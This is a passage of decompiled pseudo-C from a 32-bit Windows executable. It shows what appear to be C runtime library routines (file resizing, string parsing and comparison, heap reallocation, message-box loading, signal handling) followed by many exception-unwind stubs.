        puVar2 = (uint *)(pcVar1 + (int)puVar2 + 1);
      }
    }
    if (puVar2 != (uint *)0x0) {
      if (puVar2 == *param_4) {
        *(undefined *)puVar2 = 0;
        puVar2 = (uint *)((int)puVar2 + 1);
      }
      *(undefined *)puVar2 = 0;
    }
    FUN_004150a9(DAT_0042521c);
    DAT_0042521c = (uint *)0x0;
    uVar3 = 0;
  }
  return uVar3;
}



int __cdecl FUN_0041d577(uint param_1,int param_2)

{
  DWORD DVar1;
  DWORD DVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  HANDLE hFile;
  BOOL BVar6;
  undefined1 unaff_BP;
  int iVar7;
  uint uVar8;
  uint local_1004 [1015];
  undefined4 uStackY_28;
  
  FUN_00415a50(unaff_BP);
  iVar7 = 0;
  if ((param_1 < DAT_00426800) &&
     ((*(byte *)((&DAT_00426700)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) & 1) != 0)) {
    DVar1 = FUN_00417e5b(param_1,0,1);
    if ((DVar1 != 0xffffffff) && (DVar2 = FUN_00417e5b(param_1,0,2), DVar2 != 0xffffffff)) {
      uVar8 = param_2 - DVar2;
      if ((int)uVar8 < 1) {
        if ((int)uVar8 < 0) {
          FUN_00417e5b(param_1,param_2,0);
          hFile = (HANDLE)FUN_0041c36b(param_1);
          BVar6 = SetEndOfFile(hFile);
          iVar7 = (BVar6 != 0) - 1;
          if (iVar7 == -1) {
            DAT_00425194 = 0xd;
            DAT_00425198 = GetLastError();
          }
        }
      }
      else {
        FUN_00419530(local_1004,0,0x1000);
        uStackY_28 = 0x41d607;
        iVar3 = FUN_0041dcfd(param_1,0x8000);
        do {
          uVar4 = 0x1000;
          if ((int)uVar8 < 0x1000) {
            uVar4 = uVar8;
          }
          iVar5 = FUN_00419e88(param_1,(char *)local_1004,uVar4);
          if (iVar5 == -1) {
            if (DAT_00425198 == 5) {
              DAT_00425194 = 0xd;
            }
            iVar7 = -1;
            break;
          }
          uVar8 = uVar8 - iVar5;
        } while (0 < (int)uVar8);
        FUN_0041dcfd(param_1,iVar3);
      }
      FUN_00417e5b(param_1,DVar1,0);
      return iVar7;
    }
  }
  else {
    DAT_00425194 = 9;
  }
  return -1;
}



int __thiscall FUN_0041d6bd(void *this,byte *param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  undefined *puVar6;
  
  while( true ) {
    if (DAT_00408e0c < 2) {
      uVar1 = (byte)PTR_DAT_00408c00[(uint)*param_1 * 2] & 8;
      this = PTR_DAT_00408c00;
    }
    else {
      puVar6 = (undefined *)0x8;
      uVar1 = FUN_0041b5b5(this,(uint)*param_1,8);
      this = puVar6;
    }
    if (uVar1 == 0) break;
    param_1 = param_1 + 1;
  }
  uVar1 = (uint)*param_1;
  pbVar5 = param_1 + 1;
  if ((uVar1 == 0x2d) || (uVar4 = uVar1, uVar1 == 0x2b)) {
    uVar4 = (uint)*pbVar5;
    pbVar5 = param_1 + 2;
  }
  iVar3 = 0;
  while( true ) {
    if (DAT_00408e0c < 2) {
      uVar2 = (byte)PTR_DAT_00408c00[uVar4 * 2] & 4;
    }
    else {
      puVar6 = (undefined *)0x4;
      uVar2 = FUN_0041b5b5(this,uVar4,4);
      this = puVar6;
    }
    if (uVar2 == 0) break;
    iVar3 = (uVar4 - 0x30) + iVar3 * 10;
    uVar4 = (uint)*pbVar5;
    pbVar5 = pbVar5 + 1;
  }
  if (uVar1 == 0x2d) {
    iVar3 = -iVar3;
  }
  return iVar3;
}



uint * __cdecl FUN_0041d750(uint *param_1,uint *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  char cVar3;
  uint uVar4;
  uint *puVar5;
  
  if (param_3 == 0) {
    return param_1;
  }
  puVar5 = param_1;
  if (((uint)param_2 & 3) != 0) {
    while( true ) {
      cVar3 = *(char *)param_2;
      param_2 = (uint *)((int)param_2 + 1);
      *(char *)puVar5 = cVar3;
      puVar5 = (uint *)((int)puVar5 + 1);
      param_3 = param_3 - 1;
      if (param_3 == 0) {
        return param_1;
      }
      if (cVar3 == '\0') break;
      if (((uint)param_2 & 3) == 0) {
        uVar4 = param_3 >> 2;
        goto joined_r0x0041d78e;
      }
    }
    do {
      if (((uint)puVar5 & 3) == 0) {
        uVar4 = param_3 >> 2;
        cVar3 = '\0';
        if (uVar4 == 0) goto LAB_0041d7cb;
        goto LAB_0041d839;
      }
      *(undefined *)puVar5 = 0;
      puVar5 = (uint *)((int)puVar5 + 1);
      param_3 = param_3 - 1;
    } while (param_3 != 0);
    return param_1;
  }
  uVar4 = param_3 >> 2;
  if (uVar4 != 0) {
    do {
      uVar1 = *param_2;
      uVar2 = *param_2;
      param_2 = param_2 + 1;
      if (((uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff) & 0x81010100) != 0) {
        if ((char)uVar2 == '\0') {
          *puVar5 = 0;
joined_r0x0041d835:
          while( true ) {
            uVar4 = uVar4 - 1;
            puVar5 = puVar5 + 1;
            if (uVar4 == 0) break;
LAB_0041d839:
            *puVar5 = 0;
          }
          cVar3 = '\0';
          param_3 = param_3 & 3;
          if (param_3 != 0) goto LAB_0041d7cb;
          return param_1;
        }
        if ((char)(uVar2 >> 8) == '\0') {
          *puVar5 = uVar2 & 0xff;
          goto joined_r0x0041d835;
        }
        if ((uVar2 & 0xff0000) == 0) {
          *puVar5 = uVar2 & 0xffff;
          goto joined_r0x0041d835;
        }
        if ((uVar2 & 0xff000000) == 0) {
          *puVar5 = uVar2;
          goto joined_r0x0041d835;
        }
      }
      *puVar5 = uVar2;
      puVar5 = puVar5 + 1;
      uVar4 = uVar4 - 1;
joined_r0x0041d78e:
    } while (uVar4 != 0);
    param_3 = param_3 & 3;
    if (param_3 == 0) {
      return param_1;
    }
  }
  do {
    cVar3 = *(char *)param_2;
    param_2 = (uint *)((int)param_2 + 1);
    *(char *)puVar5 = cVar3;
    puVar5 = (uint *)((int)puVar5 + 1);
    if (cVar3 == '\0') {
      while (param_3 = param_3 - 1, param_3 != 0) {
LAB_0041d7cb:
        *(char *)puVar5 = cVar3;
        puVar5 = (uint *)((int)puVar5 + 1);
      }
      return param_1;
    }
    param_3 = param_3 - 1;
  } while (param_3 != 0);
  return param_1;
}



BOOL __cdecl
FUN_0041d84e(DWORD param_1,LPCSTR param_2,int param_3,LPWORD param_4,UINT param_5,LCID param_6,
            int param_7)

{
  undefined *puVar1;
  BOOL BVar2;
  int iVar3;
  undefined unaff_DI;
  undefined4 *unaff_FS_OFFSET;
  WORD local_20 [2];
  undefined *local_1c;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_00401680;
  puStack_10 = &LAB_0041bc48;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  local_1c = &stack0xffffffc8;
  iVar3 = DAT_0042547c;
  puVar1 = &stack0xffffffc8;
  if (DAT_0042547c == 0) {
    BVar2 = GetStringTypeW(1,L"",1,local_20);
    iVar3 = 1;
    puVar1 = local_1c;
    if (BVar2 != 0) goto LAB_0041d8bd;
    BVar2 = GetStringTypeA(0,1,"",1,local_20);
    if (BVar2 != 0) {
      iVar3 = 2;
      puVar1 = local_1c;
      goto LAB_0041d8bd;
    }
  }
  else {
LAB_0041d8bd:
    local_1c = puVar1;
    DAT_0042547c = iVar3;
    if (DAT_0042547c == 2) {
      if (param_6 == 0) {
        param_6 = DAT_00425250;
      }
      BVar2 = GetStringTypeA(param_6,param_1,param_2,param_3,param_4);
      goto LAB_0041d985;
    }
    if (DAT_0042547c == 1) {
      if (param_5 == 0) {
        param_5 = DAT_00425260;
      }
      iVar3 = MultiByteToWideChar(param_5,(-(uint)(param_7 != 0) & 8) + 1,param_2,param_3,
                                  (LPWSTR)0x0,0);
      if (iVar3 != 0) {
        local_8 = 0;
        FUN_00415a50(unaff_DI);
        local_1c = &stack0xffffffc8;
        FUN_00419530((uint *)&stack0xffffffc8,0,iVar3 * 2);
        local_8 = 0xffffffff;
        if ((&stack0x00000000 != (undefined *)0x38) &&
           (iVar3 = MultiByteToWideChar(param_5,1,param_2,param_3,(LPWSTR)&stack0xffffffc8,iVar3),
           iVar3 != 0)) {
          BVar2 = GetStringTypeW(param_1,(LPCWSTR)&stack0xffffffc8,iVar3,param_4);
          goto LAB_0041d985;
        }
      }
    }
  }
  BVar2 = 0;
LAB_0041d985:
  *unaff_FS_OFFSET = local_14;
  return BVar2;
}



void __cdecl FUN_0041d997(byte param_1)

{
  FUN_0041d9a8(param_1,0,4);
  return;
}



undefined4 __cdecl FUN_0041d9a8(byte param_1,uint param_2,byte param_3)

{
  uint uVar1;
  
  if (((&DAT_004255c1)[param_1] & param_3) == 0) {
    if (param_2 == 0) {
      uVar1 = 0;
    }
    else {
      uVar1 = *(ushort *)(&DAT_00408c0a + (uint)param_1 * 2) & param_2;
    }
    if (uVar1 == 0) {
      return 0;
    }
  }
  return 1;
}



int __cdecl FUN_0041d9d9(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  HMODULE hModule;
  int iVar1;
  
  iVar1 = 0;
  if (DAT_00425480 == (FARPROC)0x0) {
    hModule = LoadLibraryA("user32.dll");
    if (hModule != (HMODULE)0x0) {
      DAT_00425480 = GetProcAddress(hModule,"MessageBoxA");
      if (DAT_00425480 != (FARPROC)0x0) {
        DAT_00425484 = GetProcAddress(hModule,"GetActiveWindow");
        DAT_00425488 = GetProcAddress(hModule,"GetLastActivePopup");
        goto LAB_0041da28;
      }
    }
    iVar1 = 0;
  }
  else {
LAB_0041da28:
    if (DAT_00425484 != (FARPROC)0x0) {
      iVar1 = (*DAT_00425484)();
      if ((iVar1 != 0) && (DAT_00425488 != (FARPROC)0x0)) {
        iVar1 = (*DAT_00425488)(iVar1);
      }
    }
    iVar1 = (*DAT_00425480)(iVar1,param_1,param_2,param_3);
  }
  return iVar1;
}



void FUN_0041da62(void)

{
  FUN_004168e0(2);
  return;
}



undefined4 __cdecl FUN_0041da6b(int param_1)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  code *pcVar6;
  
  iVar2 = param_1;
  if (param_1 == 2) {
    puVar3 = &DAT_0042548c;
    pcVar6 = DAT_0042548c;
  }
  else if (((param_1 == 4) || (param_1 == 8)) || (param_1 == 0xb)) {
    puVar3 = FUN_0041db98(param_1);
    pcVar6 = (code *)puVar3[2];
    puVar3 = puVar3 + 2;
  }
  else if (param_1 == 0xf) {
    puVar3 = &DAT_00425498;
    pcVar6 = DAT_00425498;
  }
  else if (param_1 == 0x15) {
    puVar3 = &DAT_00425490;
    pcVar6 = DAT_00425490;
  }
  else {
    if (param_1 != 0x16) {
      return 0xffffffff;
    }
    puVar3 = &DAT_00425494;
    pcVar6 = DAT_00425494;
  }
  if (pcVar6 == (code *)0x1) {
    return 0;
  }
  if (pcVar6 == (code *)0x0) {
    puVar3 = (undefined4 *)FUN_00415edd(3);
  }
  iVar1 = DAT_0042535c;
  iVar4 = DAT_00408e9c;
  if (((param_1 == 8) || (param_1 == 0xb)) || (iVar5 = param_1, param_1 == 4)) {
    DAT_0042535c = 0;
    iVar5 = iVar1;
    if (param_1 == 8) {
      DAT_00408e9c = 0x8c;
      param_1 = iVar4;
      goto LAB_0041db2f;
    }
LAB_0041db5b:
    *puVar3 = 0;
    if (iVar2 != 8) {
      (*pcVar6)(iVar2);
      if ((iVar2 != 0xb) && (iVar2 != 4)) {
        return 0;
      }
      goto LAB_0041db7e;
    }
  }
  else {
LAB_0041db2f:
    if (iVar2 != 8) goto LAB_0041db5b;
    if (DAT_00408e90 < DAT_00408e94 + DAT_00408e90) {
      iVar4 = (DAT_00408e94 + DAT_00408e90) - DAT_00408e90;
      puVar3 = (undefined4 *)(DAT_00408e90 * 0xc + 0x408e20);
      do {
        *puVar3 = 0;
        puVar3 = puVar3 + 3;
        iVar4 = iVar4 + -1;
      } while (iVar4 != 0);
    }
  }
  (*pcVar6)(8,DAT_00408e9c);
LAB_0041db7e:
  if (iVar2 == 8) {
    DAT_00408e9c = param_1;
  }
  DAT_0042535c = iVar5;
  return 0;
}



undefined4 * __cdecl FUN_0041db98(int param_1)

{
  int *piVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  
  puVar2 = &DAT_00408e18;
  if (DAT_00408e1c != param_1) {
    puVar3 = puVar2;
    do {
      puVar2 = puVar3 + 3;
      if (&DAT_00408e18 + DAT_00408e98 * 3 <= puVar2) break;
      piVar1 = puVar3 + 4;
      puVar3 = puVar2;
    } while (*piVar1 != param_1);
  }
  if ((&DAT_00408e18 + DAT_00408e98 * 3 <= puVar2) || (puVar2[1] != param_1)) {
    puVar2 = (undefined4 *)0x0;
  }
  return puVar2;
}



int * __cdecl FUN_0041dbdd(int *param_1,uint *param_2)

{
  int *piVar1;
  uint *puVar2;
  int iVar3;
  uint *puVar4;
  
  if (param_1 == (int *)0x0) {
    piVar1 = (int *)FUN_00415216(param_2);
  }
  else {
    if (param_2 == (uint *)0x0) {
      FUN_004150a9(param_1);
    }
    else {
      do {
        piVar1 = (int *)0x0;
        if (param_2 < (uint *)0xffffffe1) {
          puVar2 = (uint *)FUN_004169a3((int)param_1);
          if (puVar2 == (uint *)0x0) {
            if (param_2 == (uint *)0x0) {
              param_2 = (uint *)0x1;
            }
            param_2 = (uint *)((int)param_2 + 0xfU & 0xfffffff0);
            piVar1 = (int *)HeapReAlloc(DAT_0042681c,0,param_1,(SIZE_T)param_2);
          }
          else {
            if (param_2 <= DAT_00408708) {
              iVar3 = FUN_004171ae(puVar2,(int)param_1,(int)param_2);
              piVar1 = param_1;
              if (iVar3 == 0) {
                piVar1 = FUN_00416cf9(param_2);
                if (piVar1 == (int *)0x0) goto LAB_0041dc76;
                puVar4 = (uint *)(param_1[-1] - 1U);
                if (param_2 <= (uint *)(param_1[-1] - 1U)) {
                  puVar4 = param_2;
                }
                FUN_00417960(piVar1,param_1,(uint)puVar4);
                FUN_004169ce(puVar2,(uint)param_1);
              }
              if (piVar1 != (int *)0x0) {
                return piVar1;
              }
            }
LAB_0041dc76:
            if (param_2 == (uint *)0x0) {
              param_2 = (uint *)0x1;
            }
            param_2 = (uint *)((int)param_2 + 0xfU & 0xfffffff0);
            piVar1 = (int *)HeapAlloc(DAT_0042681c,0,(SIZE_T)param_2);
            if (piVar1 == (int *)0x0) goto LAB_0041dcd9;
            puVar4 = (uint *)(param_1[-1] - 1U);
            if (param_2 <= (uint *)(param_1[-1] - 1U)) {
              puVar4 = param_2;
            }
            FUN_00417960(piVar1,param_1,(uint)puVar4);
            FUN_004169ce(puVar2,(uint)param_1);
          }
          if (piVar1 != (int *)0x0) {
            return piVar1;
          }
        }
LAB_0041dcd9:
        if (DAT_00425228 == 0) {
          return piVar1;
        }
        iVar3 = FUN_00417c95(param_2);
      } while (iVar3 != 0);
    }
    piVar1 = (int *)0x0;
  }
  return piVar1;
}



int __cdecl FUN_0041dcfd(uint param_1,int param_2)

{
  byte bVar1;
  byte bVar2;
  
  if (param_1 < DAT_00426800) {
    bVar1 = *(byte *)((&DAT_00426700)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8);
    if ((bVar1 & 1) != 0) {
      if (param_2 == 0x8000) {
        bVar2 = bVar1 & 0x7f;
      }
      else {
        if (param_2 != 0x4000) {
          DAT_00425194 = 0x16;
          return -1;
        }
        bVar2 = bVar1 | 0x80;
      }
      *(byte *)((&DAT_00426700)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 8) = bVar2;
      return (-(uint)((bVar1 & 0x80) != 0) & 0xffffc000) + 0x8000;
    }
  }
  DAT_00425194 = 9;
  return -1;
}



void RtlUnwind(PVOID TargetFrame,PVOID TargetIp,PEXCEPTION_RECORD ExceptionRecord,PVOID ReturnValue)

{
                    // WARNING: Could not recover jumptable at 0x0041dd80. Too many branches
                    // WARNING: Treating indirect jump as call
  RtlUnwind(TargetFrame,TargetIp,ExceptionRecord,ReturnValue);
  return;
}



uint __thiscall FUN_0041dd90(void *this,byte *param_1,byte *param_2)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  uint uVar4;
  void *this_00;
  void *extraout_ECX;
  uint uVar5;
  
  if (DAT_00425250 == 0) {
    bVar3 = 0xff;
    do {
      do {
        if (bVar3 == 0) goto LAB_0041ddde;
        bVar3 = *param_2;
        param_2 = param_2 + 1;
        bVar2 = *param_1;
        param_1 = param_1 + 1;
      } while (bVar2 == bVar3);
      bVar1 = bVar3 + 0xbf + (-((byte)(bVar3 + 0xbf) < 0x1a) & 0x20U) + 0x41;
      bVar2 = bVar2 + 0xbf;
      bVar3 = bVar2 + (-(bVar2 < 0x1a) & 0x20U) + 0x41;
    } while (bVar3 == bVar1);
    bVar3 = (bVar3 < bVar1) * -2 + 1;
LAB_0041ddde:
    uVar4 = (uint)(char)bVar3;
  }
  else {
    uVar4 = 0xff;
    uVar5 = 0;
    do {
      do {
        if ((char)uVar4 == '\0') {
          return uVar4;
        }
        bVar3 = *param_2;
        uVar4 = CONCAT31((int3)(uVar4 >> 8),bVar3);
        param_2 = param_2 + 1;
        bVar2 = *param_1;
        uVar5 = CONCAT31((int3)(uVar5 >> 8),bVar2);
        param_1 = param_1 + 1;
      } while (bVar3 == bVar2);
      uVar5 = FUN_004165fd(this,uVar5);
      uVar4 = FUN_004165fd(this_00,uVar4);
      this = extraout_ECX;
    } while ((byte)uVar5 == (byte)uVar4);
    uVar4 = (uint)((byte)uVar5 < (byte)uVar4);
    uVar4 = (1 - uVar4) - (uint)(uVar4 != 0);
  }
  return uVar4;
}



void * __cdecl FUN_0041de20(byte *param_1,char *param_2,void *param_3)

{
  char cVar1;
  byte bVar2;
  ushort uVar3;
  uint uVar4;
  void *this;
  uint uVar5;
  bool bVar6;
  
  if (param_3 != (void *)0x0) {
    if (DAT_00425250 == 0) {
      do {
        bVar2 = *param_1;
        cVar1 = *param_2;
        uVar3 = CONCAT11(bVar2,cVar1);
        if (bVar2 == 0) break;
        uVar3 = CONCAT11(bVar2,cVar1);
        uVar5 = (uint)uVar3;
        if (cVar1 == '\0') break;
        param_1 = param_1 + 1;
        param_2 = param_2 + 1;
        if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
          uVar5 = (uint)CONCAT11(bVar2 + 0x20,cVar1);
        }
        uVar3 = (ushort)uVar5;
        bVar2 = (byte)uVar5;
        if ((0x40 < bVar2) && (bVar2 < 0x5b)) {
          uVar3 = (ushort)CONCAT31((int3)(uVar5 >> 8),bVar2 + 0x20);
        }
        bVar2 = (byte)(uVar3 >> 8);
        bVar6 = bVar2 < (byte)uVar3;
        if (bVar2 != (byte)uVar3) goto LAB_0041de7b;
        param_3 = (void *)((int)param_3 + -1);
      } while (param_3 != (void *)0x0);
      param_3 = (void *)0x0;
      bVar2 = (byte)(uVar3 >> 8);
      bVar6 = bVar2 < (byte)uVar3;
      if (bVar2 != (byte)uVar3) {
LAB_0041de7b:
        param_3 = (void *)0xffffffff;
        if (!bVar6) {
          param_3 = (void *)0x1;
        }
      }
    }
    else {
      uVar4 = 0;
      uVar5 = 0;
      do {
        uVar4 = CONCAT31((int3)(uVar4 >> 8),*param_1);
        uVar5 = CONCAT31((int3)(uVar5 >> 8),*param_2);
        if ((uVar4 == 0) || (uVar5 == 0)) break;
        param_1 = param_1 + 1;
        param_2 = param_2 + 1;
        uVar5 = FUN_004165fd(param_3,uVar5);
        uVar4 = FUN_004165fd(this,uVar4);
        bVar6 = uVar4 < uVar5;
        if (uVar4 != uVar5) goto LAB_0041debd;
        param_3 = (void *)((int)param_3 + -1);
      } while (param_3 != (void *)0x0);
      param_3 = (void *)0x0;
      bVar6 = uVar4 < uVar5;
      if (uVar4 != uVar5) {
LAB_0041debd:
        param_3 = (void *)0xffffffff;
        if (!bVar6) {
          param_3 = (void *)0x1;
        }
      }
    }
  }
  return param_3;
}



void Unwind_0041ded0(void)

{
  int unaff_EBP;
  
  FUN_00409ca0((undefined4 *)(unaff_EBP + -0x824));
  return;
}



void Unwind_0041dedb(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x92c));
  return;
}



void Unwind_0041def0(void)

{
  int unaff_EBP;
  
  FUN_00409ca0((undefined4 *)(unaff_EBP + -0x424));
  return;
}



void Unwind_0041df10(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x1538));
  return;
}



void Unwind_0041df1b(void)

{
  int unaff_EBP;
  
  FUN_00409ca0((undefined4 *)(unaff_EBP + -0x1424));
  return;
}



void Unwind_0041df26(void)

{
  int unaff_EBP;
  
  FUN_004090e0((LPVOID *)(unaff_EBP + -0x1540));
  return;
}



void Unwind_0041df40(void)

{
  int unaff_EBP;
  
  FUN_0040bd40((undefined4 *)(unaff_EBP + -0x1170));
  return;
}



void Unwind_0041df4b(void)

{
  int unaff_EBP;
  
  FUN_00409ca0((undefined4 *)(unaff_EBP + -0x1024));
  return;
}



void Unwind_0041df60(void)

{
  int unaff_EBP;
  
  FUN_0040bd40((undefined4 *)(unaff_EBP + -0x63c));
  return;
}



void Unwind_0041df6b(void)

{
  int unaff_EBP;
  
  FUN_00409ca0((undefined4 *)(unaff_EBP + -0x424));
  return;
}



void Unwind_0041df76(void)

{
  int unaff_EBP;
  
  FUN_004090e0((LPVOID *)(unaff_EBP + -0x644));
  return;
}



void Unwind_0041df90(void)

{
  int unaff_EBP;
  
  FUN_004090e0((LPVOID *)(unaff_EBP + -0x1534));
  return;
}



void Unwind_0041df9b(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x152c));
  return;
}



void Unwind_0041dfa6(void)

{
  int unaff_EBP;
  
  FUN_00409ca0((undefined4 *)(unaff_EBP + -0x1424));
  return;
}



void Unwind_0041dfc0(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x118));
  return;
}



void Unwind_0041dfe0(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x114));
  return;
}



void Unwind_0041e000(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x21c));
  return;
}



void Unwind_0041e020(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x1414));
  return;
}



void Unwind_0041e040(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x114));
  return;
}



void Unwind_0041e060(void)

{
  int unaff_EBP;
  
  FUN_0040bd40((undefined4 *)(unaff_EBP + -0x418));
  return;
}



void Unwind_0041e080(void)

{
  int unaff_EBP;
  
  FUN_0040bd40((undefined4 *)(unaff_EBP + -0x18));
  return;
}



void Unwind_0041e0a0(void)

{
  int unaff_EBP;
  
  FUN_0040bd40((undefined4 *)(unaff_EBP + -0x118));
  return;
}



void Unwind_0041e0c0(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x1168));
  return;
}



void Unwind_0041e0cb(void)

{
  int unaff_EBP;
  
  FUN_00409fd0((undefined4 *)(unaff_EBP + -0x1158));
  return;
}



void Unwind_0041e0d6(void)

{
  int unaff_EBP;
  
  FUN_00411af0((undefined4 *)(unaff_EBP + -0x1140));
  return;
}



void Unwind_0041e0f0(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0xa2c));
  return;
}



void Unwind_0041e0fb(void)

{
  int unaff_EBP;
  
  FUN_00409fd0((undefined4 *)(unaff_EBP + -0xa24));
  return;
}



void Unwind_0041e110(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0xa38));
  return;
}



void Unwind_0041e11b(void)

{
  int unaff_EBP;
  
  FUN_00409fd0((undefined4 *)(unaff_EBP + -0xa30));
  return;
}



void Unwind_0041e130(void)

{
  int unaff_EBP;
  
  FUN_0040bd40((undefined4 *)(unaff_EBP + -0x1570));
  return;
}



void Unwind_0041e13b(void)

{
  int unaff_EBP;
  
  FUN_00409ca0((undefined4 *)(unaff_EBP + -0xc24));
  return;
}



void Unwind_0041e150(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x214));
  return;
}



void Unwind_0041e170(void)

{
  int unaff_EBP;
  
  FUN_00409fd0((undefined4 *)(unaff_EBP + -0xd50));
  return;
}



void Unwind_0041e17b(void)

{
  int unaff_EBP;
  
  FUN_0040bd40((undefined4 *)(unaff_EBP + -0xd38));
  return;
}



void Unwind_0041e186(void)

{
  int unaff_EBP;
  
  FUN_00409fd0((undefined4 *)(unaff_EBP + -0xd24));
  return;
}



void Unwind_0041e1a0(void)

{
  int unaff_EBP;
  
  FUN_00411af0((undefined4 *)(unaff_EBP + -0xa44));
  return;
}



void Unwind_0041e1c0(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x114));
  return;
}



void Unwind_0041e1e0(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0xe14));
  return;
}



void Unwind_0041e1f8(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x14));
  return;
}



void Unwind_0041e20c(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x14));
  return;
}



void Unwind_0041e220(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x14));
  return;
}



void Unwind_0041e234(void)

{
  int unaff_EBP;
  
  FUN_0041205e((undefined4 *)(unaff_EBP + -0x14));
  return;
}


